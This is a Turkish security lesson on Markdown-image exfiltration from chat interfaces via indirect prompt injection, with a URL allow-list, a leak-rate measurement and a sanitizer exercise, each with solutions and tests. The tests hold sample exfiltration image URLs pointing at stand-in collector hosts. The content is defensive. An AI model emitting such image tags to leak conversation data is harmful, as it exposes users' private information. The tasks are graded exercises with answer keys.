---
id: ai-olay-05
title: "Markdown Görüntü Önizleme · Aktif Render ve Egress Sınırı"
summary: Sohbet arayüzünde otomatik yüklenen Markdown görsellerinin URL sızıntısına dönüşmesini kanonik resim süzgeci, canlı senaryo ölçümü ve güvenli yeniden yazımla önle.
esleme: ai-saldiri-09, ai-saldiri-23, ai-savunma-08, ai-savunma-14
timeout: 30
---

::: anlat 1. Gerçek olay ve yerel kopya sınırı
2023'ten itibaren birçok sohbet arayüzünde tartışılan ve **NVIDIA AI Red Team** rehberinde mimari bir risk sınıfı olarak özetlenen **Markdown aktif görüntü önizleme (`auto-rendered Markdown image exfiltration`)** sorunu, model çıktısındaki `![alt](https://...)` etiketinin tarayıcı tarafından kullanıcı tıklaması olmadan otomatik indirilmesine dayanır. Bağlama dolaylı `prompt injection` girdiğinde model, önceki konuşma özetini görüntü URL'sinin sorgu parametresine (`?q=...`) ekleyerek dış sunucuya gönderebilir.

> [!NOTE]
> **Yerel kopya ayrımı:** Bu ders belirli bir sohbet ürününün güncel istemci kodunu kopyalamaz ve dış ağa istek atmaz. Markdown çıktısındaki görüntü etiketlerini normal bağlantılardan ayırmayı, kanonik URL politikası uygulamayı ve engellenen görselleri etkisiz yer tutucuya dönüştürmeyi çevrimdışı modeller.
:::

::: anlat 2. Mekanizma · tıklanan bağlantı ile otomatik yüklenen görüntü farkı
Normal bir Markdown bağlantısı (`[rapor](https://...)`) kullanıcı tıklayana kadar ağ isteği üretmez; oysa görüntü etiketi (`![logo](https://...)`) DOM'a eklendiği anda `GET` isteği başlatır (`ai-saldiri-09`, `ai-saldiri-23`).

Güvenli bir istemci/sunucu önizleme katmanı üç kural uygular:
1. Yalnız `![alt](URL)` biçimindeki görüntü etiketlerini yakalar; düz `[metin](URL)` bağlantılarını görsel saymaz.
2. Yalnız sabit kurum içi varlık sunucusuna (`https://arsiv.invalid`, kullanıcı bilgisiz, port `None`/`443`) izin verir.
3. **Sorgu (`query`) ve parça (`fragment`) alanlarını kesinlikle boş tutar:** İzinli alan adı üzerinde bile `?gizli=VERI` parametresi vekil/CDN günlüklerine veya açık yönlendirmeye veri sızdırabilir!

**Yaygın yanlışlar**

| Yanlış yaklaşım | Neden kırılır? | Doğru sınır |
|---|---|---|
| `[alt](url)` kalıbını ünlemsiz aramak | Düz metin bağlantılarını da görsel sanıp yanlış sınıflandırır | `!\[[^\]]*\]\(([^\s()]+)\)` ile yalnız görüntü etiketlerini seçmek |
| `p.hostname == 'arsiv.invalid'` deyip `p.query` alanını unutmak | `https://arsiv.invalid/logo?c=CANARY` sorgu sızıntısını geçirir | `not p.query and not p.fragment` ve `username/password is None` |
| Engellenen görselin URL'sini HTML `<img>` içinde bırakmak | Tarayıcı yine önizleme isteği gönderir | Yasaklı görseli düz metin yer tutucusuna (`[gorsel engellendi: alt]`) çevirmek |
:::

::: tahmin İzinli alan adında sorgu parametresi neden sızıntı kanalıdır?
Alan adı kontrolünden geçen aşağıdaki iki görüntü etiketinden hangisi konuşma verisini URL'ye taşır?

```python
from urllib.parse import urlsplit

for u in ['https://arsiv.invalid/logo', 'https://arsiv.invalid/logo?ozet=GIZLI_NOT']:
    p = urlsplit(u)
    sadece_alan = (p.scheme == 'https' and p.hostname == 'arsiv.invalid')
    tam_kural = sadece_alan and not p.query and not p.fragment
    print(sadece_alan, tam_kural, '->', u)
```

???

```cikti
True True -> https://arsiv.invalid/logo
True False -> https://arsiv.invalid/logo?ozet=GIZLI_NOT
```
Sabit kurumsal varlıkların (`/logo`, `/simge`) dinamik sorgu parametresine ihtiyacı yoktur; sorgu dizgesini kapatmak, izinli alan adı üzerinden bile parametre tabanlı veri kaçırmayı keser.
:::

::: gorev 1 · Markdown görüntü URL izin listesini (`resim_izinleri`) kur
`resim_izinleri(metin)` işlevini yaz:

- `metin` `str` değilse `ValueError` fırlat.
- Yalnız `![alt](URL)` biçimindeki görüntü etiketlerini (URL içinde boşluk veya parantez olmadan: `!\[[^\]]*\]\(([^\s()]+)\)`) metindeki sırasıyla tara; düz `[alt](URL)` bağlantılarını **atla**.
- Her bulunan görüntü URL'si için `[url, izin]` iki elemanlı listesini üret:
  - `izin = True` olması için: şema `'https'`, `hostname == 'arsiv.invalid'`, `username is None`, `password is None`, `port in (None, 443)`, `query == ''` ve `fragment == ''` koşulları birlikte sağlanmalıdır.
  - Aksi her durumda `izin = False`.
- Dönüş: `[[url, izin], ...]`.

KUSURLU başlangıç `https://` ile başlayan her görsele alan adı ve sorgu parametresi bakmadan `True` veriyor!

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
Path('ornek.json').write_text('[\n  "![a](https://arsiv.invalid/logo)"\n]', encoding='utf-8')
```

```starter
import re

def resim_izinleri(metin):
    return [[u, u.startswith('https://')] for u in re.findall(r'!\[[^\]]*\]\(([^\s()]+)\)', metin)]

if __name__ == '__main__':
    import json
    from pathlib import Path
    _args = json.loads(Path('ornek.json').read_text(encoding='utf-8'))
    print(resim_izinleri(*_args))
```

```solution
import re
from urllib.parse import urlsplit

def resim_izinleri(metin):
    if not isinstance(metin, str):
        raise ValueError('metin str olmali')
    cikti = []
    for url in re.findall(r'!\[[^\]]*\]\(([^\s()]+)\)', metin):
        try:
            p = urlsplit(url)
            port = p.port
            izin = (
                p.scheme == 'https'
                and p.hostname == 'arsiv.invalid'
                and p.username is None
                and p.password is None
                and port in (None, 443)
                and not p.query
                and not p.fragment
            )
        except ValueError:
            izin = False
        cikti.append([url, bool(izin)])
    return cikti

if __name__ == '__main__':
    import json
    from pathlib import Path
    _args = json.loads(Path('ornek.json').read_text(encoding='utf-8'))
    print(resim_izinleri(*_args))
```

```test
need('resim_izinleri')
eq(resim_izinleri('![a](https://arsiv.invalid/logo)'), [['https://arsiv.invalid/logo', True]], 'temiz kurumsal görsel izinli')
eq(resim_izinleri('![b](https://arsiv.invalid:443/simge) ve [duz](https://collector.invalid/x)'), [
    ['https://arsiv.invalid:443/simge', True],
], '443 portu izinli, düz bağlantı görsel listesine girmez')

_saldirilar = [
    '![x](https://collector.invalid/p?c=CANARY)',
    '![x](https://arsiv.invalid/logo?c=CANARY)',
    '![x](https://arsiv.invalid/logo#CANARY)',
    '![x](https://arsiv.invalid.evil.invalid/logo)',
    '![x](https://arsiv.invalid@collector.invalid/logo)',
    '![x](https://u:p@arsiv.invalid/logo)',
    '![x](https://arsiv.invalid:8443/logo)',
    '![x](https://arsiv.invalid:abc/logo)',
    '![x](http://arsiv.invalid/logo)',
]
for _m in _saldirilar:
    _sonuc = resim_izinleri(_m)
    eq(len(_sonuc), 1, 'görsel yakalanmalı')
    eq(_sonuc[0][1], False, f'güvensiz görsel URL engellenmeli: {_m}')

eq(resim_izinleri('Görsel olmayan metin [link](https://arsiv.invalid/logo)'), [], 'hiç görsel yoksa boş liste')
eq(resim_izinleri('![x](https://kullanici@arsiv.invalid/logo)'), [['https://kullanici@arsiv.invalid/logo', False]],
   'yalnız kullanıcı adı taşıyan görsel URL engellenmeli')
for _bozuk in (None, 123, ['![a](https://arsiv.invalid/logo)']):
    raises(ValueError, resim_izinleri, _bozuk, msg='str dışı girdi ValueError fırlatmalı')
```

```hint
`!\[[^\]]*\]\(([^\s()]+)\)` ile yalnız ünlemli görüntü etiketlerini bul; her URL için `scheme`, `hostname`, `username`, `password`, `port in (None, 443)`, `not p.query`, `not p.fragment` kontrolünü yap.
```
:::

::: gorev 2 · Açık ve yamalı önizleme kapısını senaryo vakalarında ölç
`onizleme_senaryo_olc(vakalar, acik_fn, yamali_fn)` işlevini yaz:

- Her vaka `{'saldiri': bool, 'girdi': (markdown_metin,), ...}` sözlüğüdür. Şema veya işlevler geçersizse `ValueError` fırlat.
- Sınır işlevi `[[url, izin], ...]` biçiminde bir liste döndürür:
  - Saldırı vakasında (`saldiri is True`), dönen çiftlerden **herhangi birinde** `izin is True` ise tehlikeli görsel yüklenmiş demektir (**sızıntı**).
  - Meşru vakada (`saldiri is False`), liste boş değil **ve** tüm çiftlerde `izin is True` ise meşru görseller korunmuş demektir (**meşru kabul**; `once` kabul ederken `sonra` bozarsa `regresyon_n` artar).
- Dönüş: `{'saldiri_n': int, 'mesru_n': int, 'once_sizma': float|None, 'sonra_sizma': float|None, 'mesru_kabul': float|None, 'regresyon_n': int}`.

KUSURLU başlangıç yalnız ilk görselin (`sonuc[0][1]`) iznine baktığı için çok görselli vakalarda ikinci görseldeki sızıntıyı veya regresyonu kaçırıyor!

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
```

```starter
def onizleme_senaryo_olc(vakalar, acik_fn, yamali_fn):
    s = [v for v in vakalar if v['saldiri']]
    m = [v for v in vakalar if not v['saldiri']]
    return {
        'saldiri_n': len(s), 'mesru_n': len(m),
        'once_sizma': round(sum(1 for v in s if acik_fn(*v['girdi'])[0][1]) / len(s), 4) if s else None,
        'sonra_sizma': round(sum(1 for v in s if yamali_fn(*v['girdi'])[0][1]) / len(s), 4) if s else None,
        'mesru_kabul': round(sum(1 for v in m if yamali_fn(*v['girdi'])[0][1]) / len(m), 4) if m else None,
        'regresyon_n': 0,
    }
```

```solution
import copy

def _saldiri_sizdi(ciftler):
    return isinstance(ciftler, list) and any(isinstance(x, (list, tuple)) and len(x) == 2 and x[1] is True for x in ciftler)

def _mesru_korundu(ciftler):
    return isinstance(ciftler, list) and bool(ciftler) and all(isinstance(x, (list, tuple)) and len(x) == 2 and x[1] is True for x in ciftler)

def onizleme_senaryo_olc(vakalar, acik_fn, yamali_fn):
    if not isinstance(vakalar, list) or not vakalar or not callable(acik_fn) or not callable(yamali_fn):
        raise ValueError('gecerli vakalar ve cagrilaiblir sinirlar gerekli')
    s_n = m_n = s_once = s_sonra = m_sonra = reg = 0
    for v in vakalar:
        if not isinstance(v, dict) or type(v.get('saldiri')) is not bool or not isinstance(v.get('girdi'), (tuple, list)):
            raise ValueError('bozuk vaka semasi')
        r_once = acik_fn(*copy.deepcopy(v['girdi']))
        r_sonra = yamali_fn(*copy.deepcopy(v['girdi']))
        if v['saldiri']:
            s_n += 1
            s_once += int(_saldiri_sizdi(r_once))
            s_sonra += int(_saldiri_sizdi(r_sonra))
        else:
            m_n += 1
            once_ok = _mesru_korundu(r_once)
            sonra_ok = _mesru_korundu(r_sonra)
            m_sonra += int(sonra_ok)
            if once_ok and not sonra_ok:
                reg += 1
    return {
        'saldiri_n': s_n,
        'mesru_n': m_n,
        'once_sizma': round(s_once / s_n, 4) if s_n else None,
        'sonra_sizma': round(s_sonra / s_n, 4) if s_n else None,
        'mesru_kabul': round(m_sonra / m_n, 4) if m_n else None,
        'regresyon_n': reg,
    }
```

```test
need('onizleme_senaryo_olc')
import re
from urllib.parse import urlsplit
from sandbox.ai_olay_senaryo import acik_sinir, senaryo_vakalari

def _yama(metin):
    out = []
    for u in re.findall(r'!\[[^\]]*\]\(([^\s()]+)\)', metin):
        p = urlsplit(u)
        izin = p.scheme == 'https' and p.hostname == 'arsiv.invalid' and p.username is None and p.port in (None, 443) and not p.query and not p.fragment
        out.append([u, izin])
    return out

_vakalar = senaryo_vakalari(5, tohum=3)
eq(onizleme_senaryo_olc(_vakalar, acik_sinir(5), _yama), {
    'saldiri_n': 4,
    'mesru_n': 2,
    'once_sizma': 1.0,
    'sonra_sizma': 0.0,
    'mesru_kabul': 1.0,
    'regresyon_n': 0,
}, 'açık sınır 4/4 görsel sızıntısına izin verir, yama 0.0 yapar')

_karma = [{'saldiri': True, 'girdi': ('![temiz](https://arsiv.invalid/logo) ![sizinti](https://collector.invalid/p)',)}]
eq(onizleme_senaryo_olc(_karma, acik_sinir(5), acik_sinir(5))['sonra_sizma'], 1.0, 'ikinci görseldeki sızıntı yakalanmalı')
eq(onizleme_senaryo_olc(_vakalar, acik_sinir(5), lambda _m: [])['regresyon_n'], 2, 'tüm görselleri silen yama 2 regresyon üretir')
raises(ValueError, onizleme_senaryo_olc, [], acik_sinir(5), _yama, msg='boş liste ValueError')

# Ölçüm mantığı alandan bağımsızdır. Saldırıda tek bir izinli görsel sızıntıdır;
# meşru vakada bütün görseller izinli kalmalıdır (biri bile engellenirse meşru kabul düşer).
_el = [
    {'saldiri': True, 'girdi': ('s-ikisi-gecer',)},
    {'saldiri': True, 'girdi': ('s-acik-de-durdurur',)},
    {'saldiri': True, 'girdi': ('s-yalniz-acik-gecer',)},
    {'saldiri': False, 'girdi': ('m-ikisi-gecer',)},
    {'saldiri': False, 'girdi': ('m-ikisi-durdurur',)},
    {'saldiri': False, 'girdi': ('m-regresyon',)},
]
def _sinir(gecenler):
    def _f(etiket):
        if etiket.startswith('s-'):
            # ikinci görsel izinliyse sızıntı vardır
            return [['u1', False], ['u2', etiket in gecenler]]
        # meşru: ikinci görsel engellenirse vaka korunmamış sayılır
        return [['u1', True], ['u2', etiket in gecenler]]
    return _f
_acik_el = _sinir(('s-ikisi-gecer', 's-yalniz-acik-gecer', 'm-ikisi-gecer', 'm-regresyon'))
_yama_el = _sinir(('s-ikisi-gecer', 'm-ikisi-gecer'))
eq(onizleme_senaryo_olc(_el, _acik_el, _yama_el), {
    'saldiri_n': 3,
    'mesru_n': 3,
    'once_sizma': 0.6667,
    'sonra_sizma': 0.3333,
    'mesru_kabul': 0.3333,
    'regresyon_n': 1,
}, 'oranlar grup paydasıyla ve 4 basamakla; kısmi engelleme meşru kabulü düşürür')
eq(onizleme_senaryo_olc(_el, _acik_el, _acik_el)['sonra_sizma'], 0.6667, 'yama açık sınırla aynıysa sonra_sizma = once_sizma')
eq(onizleme_senaryo_olc(_el, _sinir(()), _sinir(()))['regresyon_n'], 0, 'açık sınırın da bozduğu meşru vaka regresyon sayılmaz')
eq(onizleme_senaryo_olc([v for v in _el if v['saldiri']], _acik_el, _yama_el)['mesru_kabul'], None, 'meşru vaka yoksa mesru_kabul None')
eq(onizleme_senaryo_olc([v for v in _el if not v['saldiri']], _acik_el, _yama_el),
   {'saldiri_n': 0, 'mesru_n': 3, 'once_sizma': None, 'sonra_sizma': None, 'mesru_kabul': 0.3333, 'regresyon_n': 1},
   'saldırı vakası yoksa once_sizma ve sonra_sizma None')
# Sözleşme dışı sınır dönüşleri: liste değil, çift değil, üç elemanlı, izin bayrağı True değil.
for _tuhaf in (lambda *_a: (('u', True),), lambda *_a: [{0: 'u', 1: True}], lambda *_a: [['u', True, 'ek']],
               lambda *_a: [['u', 1]], lambda *_a: None):
    _r = onizleme_senaryo_olc(_el, _tuhaf, _tuhaf)
    eq((_r['once_sizma'], _r['mesru_kabul']), (0.0, 0.0), 'sözleşme dışı dönüş ne sızıntı ne korunmuş meşru vaka sayılır')
raises(ValueError, onizleme_senaryo_olc, tuple(_el), _acik_el, _yama_el, msg='liste olmayan vakalar ValueError')
raises(ValueError, onizleme_senaryo_olc, _el, None, _yama_el, msg='çağrılamaz açık sınır ValueError')
raises(ValueError, onizleme_senaryo_olc, _el, _acik_el, 'yama', msg='çağrılamaz yamalı sınır ValueError')
for _bozuk in (
    _el + [('s-ikisi-gecer',)],
    _el + [{'saldiri': 1, 'girdi': ('s-ikisi-gecer',)}],
    _el + [{'saldiri': True, 'girdi': None}],
):
    raises(ValueError, onizleme_senaryo_olc, _bozuk, _acik_el, _yama_el, msg=f'bozuk vaka şeması ValueError: {_bozuk[-1]!r}')
```

```hint
Saldırı vakasında `any(izin is True)` sızıntı demektir; meşru vakada ise listenin boş olmaması ve `all(izin is True)` olması gerekir.
```
:::

::: gorev 3 · Yasaklı Markdown görsellerini etkisiz metne dönüştür (`sanitizer`)
İstemciye yanıt gönderilmeden önce yasaklı görselleri DOM'dan çıkaran `markdown_resim_temizle(metin)` işlevini yaz:

- `metin` `str` değilse `ValueError` fırlat.
- Her `![alt](URL)` eşleşmesinde (`!\[([^\]]*)\]\(([^\s()]+)\)`):
  - URL Görev 1'deki kanonik kurallara uyuyorsa etiketi **olduğu gibi** koru (`korunan` sayacını 1 artır).
  - Uymuyorsa etiketi `[gorsel engellendi: <alt>]` düz metniyle değiştir (`alt` boşsa `[gorsel engellendi: adsiz]` yaz; `engellenen` sayacını 1 artır).
- Düz `[metin](URL)` bağlantılarına dokunma.
- Dönüş: `{'cikti': str, 'korunan': int, 'engellenen': int}`.

KUSURLU başlangıç engellenen görselin URL'sini yer tutucu içinde bıraktığı için sonradan çalışan otomatik linkleştiricilere sızıntı verisini yine taşıyor!

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules['__main__'].__file__).resolve().parents[1]))
```

```starter
import re

def markdown_resim_temizle(metin):
    def degis(m):
        return f'[gorsel engellendi: {m.group(2)}]'
    yeni, n = re.subn(r'!\[([^\]]*)\]\(([^\s()]+)\)', degis, metin)
    return {'cikti': yeni, 'korunan': 0, 'engellenen': n}
```

```solution
import re
from urllib.parse import urlsplit

def _resim_gecerli(url):
    try:
        p = urlsplit(url)
        port = p.port
        return (
            p.scheme == 'https'
            and p.hostname == 'arsiv.invalid'
            and p.username is None
            and p.password is None
            and port in (None, 443)
            and not p.query
            and not p.fragment
        )
    except ValueError:
        return False

def markdown_resim_temizle(metin):
    if not isinstance(metin, str):
        raise ValueError('metin str olmali')
    korunan = 0
    engellenen = 0

    def _donustur(eslesme):
        nonlocal korunan, engellenen
        alt, url = eslesme.group(1), eslesme.group(2)
        if _resim_gecerli(url):
            korunan += 1
            return eslesme.group(0)
        engellenen += 1
        etiket = alt if alt else 'adsiz'
        return f'[gorsel engellendi: {etiket}]'

    cikti = re.sub(r'!\[([^\]]*)\]\(([^\s()]+)\)', _donustur, metin)
    return {'cikti': cikti, 'korunan': korunan, 'engellenen': engellenen}
```

```test
need('markdown_resim_temizle')
_girdi = 'Başlık ![logo](https://arsiv.invalid/logo) ara ![iz](https://collector.invalid/p?s=GIZLI) son ![](http://arsiv.invalid/x) ve [ek](https://ornek.invalid)'
_sonuc = markdown_resim_temizle(_girdi)
eq(_sonuc, {
    'cikti': 'Başlık ![logo](https://arsiv.invalid/logo) ara [gorsel engellendi: iz] son [gorsel engellendi: adsiz] ve [ek](https://ornek.invalid)',
    'korunan': 1,
    'engellenen': 2,
}, 'izinli görsel ve düz link korunmalı, tehlikeli görseller URL sızdırmadan temizlenmeli')
ok('GIZLI' not in _sonuc['cikti'], 'engellenen görselin sorgu parametresi çıktıda kalmamalı')
raises(ValueError, markdown_resim_temizle, None, msg='str dışı girdi ValueError fırlatmalı')

# İzin kuralının her parçası tek başına: alan adı, kullanıcı adı, port, sorgu, parça, ayrıştırılamayan port.
for _url in ('https://evil.invalid/logo', 'https://kullanici@arsiv.invalid/logo', 'https://arsiv.invalid:8443/logo',
             'https://arsiv.invalid:444/logo', 'https://arsiv.invalid/logo?s=GIZLI', 'https://arsiv.invalid/logo#GIZLI',
             'https://arsiv.invalid:abc/logo'):
    eq(markdown_resim_temizle(f'![r]({_url})'), {'cikti': '[gorsel engellendi: r]', 'korunan': 0, 'engellenen': 1},
       f'güvensiz görsel engellenmeli: {_url}')
for _url in ('https://arsiv.invalid:443/logo', 'https://ARSIV.INVALID/logo'):
    eq(markdown_resim_temizle(f'![r]({_url})'), {'cikti': f'![r]({_url})', 'korunan': 1, 'engellenen': 0},
       f'443 portu ve büyük harfli alan adı izinli: {_url}')
```

```hint
`re.sub` içinde geri çağırma (`callback`) işlevi kullan; URL geçersizse URL'yi çıktıya hiç kopyalamadan yalnız `alt` metnini (boşsa `'adsiz'`) yer tutucuya yaz.
```
:::

::: anlat Bunu iki dakikada nasıl anlatırsın?
1. **Risk sınıfı (15 sn).** "Sohbet arayüzü modelin ürettiği `![alt](url)` görsellerini otomatik yüklediğinde, dolaylı enjeksiyon bağlamdaki veriyi sorgu parametresiyle dışarı taşıyabilir."
2. **Ayrım (30 sn).** "Tıklama bekleyen `[metin](url)` ile sıfır tıklamalı `![alt](url)` farklı tehdit yüzeyidir; izinli alan adında bile `?query` ve `#fragment` sızıntı taşır."
3. **Sınır ve ölçüm (30 sn).** "`resim_izinleri` ve `onizleme_senaryo_olc` ile çok görselli senaryolarda sızıntıyı `1.0` değerinden `0.0` değerine indirdim."
4. **İstemci arındırma (25 sn).** "`markdown_resim_temizle` ile tehlikeli URL'yi çıktıda hiç bırakmadan etkisiz metin yer tutucusuna dönüştürdüm."
5. **Kapanış (20 sn).** "Uygulama düzeyindeki Markdown temizleyici mutlaka tarayıcı `Content-Security-Policy` (`img-src`) kuralıyla desteklenmelidir."
:::

::: anlat Sınır ve kaynak
Bu derste düzenli ifade tabanlı basit `![alt](url)` kalıbı modellenmiştir. Tam CommonMark/GFM ayrıştırıcılarında referans biçimli görseller (`![alt][ref]` + `[ref]: https://...`) ve ham HTML `<img>` etiketleri de bulunur; üretim arayüzlerinde ham regex yerine AST tabanlı Markdown arındırıcı (`DOMPurify` + sıkı `CSP img-src`) kullanılır (`ai-savunma-08`).

- Birincil kaynak: [NVIDIA AI Red Team — Practical LLM Security Advice from the NVIDIA AI Red Team](https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/). Doğrulama tarihi: 10 Kasım 2026.
:::

::: dusun
Uygulamanız Markdown içindeki `![alt](url)` etiketlerini temizlediği halde referans tanımlı `![logo][1]` ve alt satırdaki `[1]: https://collector.invalid/p?q=SIR` sözdizimini atlıyorsa bunun kök nedeni nedir?
:::

::: ozet
- Otomatik yüklenen görüntü etiketleri sıfır tıklamalı `egress` kanalı oluşturur.
- İzinli sabit varlık alanında dahi `query`, `fragment`, `userinfo` ve standart dışı portlar kapatılmalıdır.
- Tehlikeli görseller temizlenirken URL dizgesi çıktıdan tamamen çıkarılır.
:::
